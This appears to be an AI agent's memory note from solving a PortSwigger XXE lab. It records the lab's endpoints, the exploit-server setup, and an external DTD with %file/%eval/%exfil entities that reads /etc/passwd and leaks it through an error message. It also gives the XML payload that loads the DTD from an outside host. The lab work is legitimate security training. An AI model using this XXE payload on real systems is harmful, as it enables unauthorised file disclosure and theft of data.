---
metadata:
  node_type: memory
name: "PortSwigger XXE Labs arm A"
description: "XXE blind error-message lab solved: external DTD with %file/%eval/%exfil exfiltrates /etc/passwd via FileNotFoundException; exploit-server id differs from instance id"
last_updated: 2026-10-10T01:25:57+08:00
created: 2026-10-10T01:25:57+08:00
---

## 2026 lab-xxe-with-data-retrieval-via-error-messages (arm A) — solved

- Path: /web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages; page_read gave lab_id 9f3ddc22; range_launch launch-url (reused:false) -> instance 0adb00220410f3d981f7efed009e0071.
- Exploit server id DIFFERS from instance id: read instance root HTML, grep 'exploit-link' -> exploit-0a830031042af3a58150ee6a0183003b.exploit-server.net. range_launch reported exploit_server:null.
- Stock form: POST /product/stock, XML body, fields productId/storeId (from /product?productId=1).
- Stored external DTD at /xxe.dtd via exploit-server POST form: formAction=STORE, urlIsHttps=true, responseFile, responseHead, responseBody. One transient "Network is unreachable" on the first POST; retry succeeded.
- DTD (external parameter entities + invalid-path error):
  ENTITY % file SYSTEM "file:///etc/passwd"
  ENTITY % eval -> ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'
  %eval; %exfil;
- Payload: XML decl + DOCTYPE foo [ENTITY % xxe SYSTEM "https://exploit-....net/xxe.dtd"; %xxe;] + stockCheck/productId/storeId, Content-Type: application/xml.
- Result: 400 with java.io.FileNotFoundException: /invalid/<etc/passwd dump>; banner_verdict solved:true with congrats line.

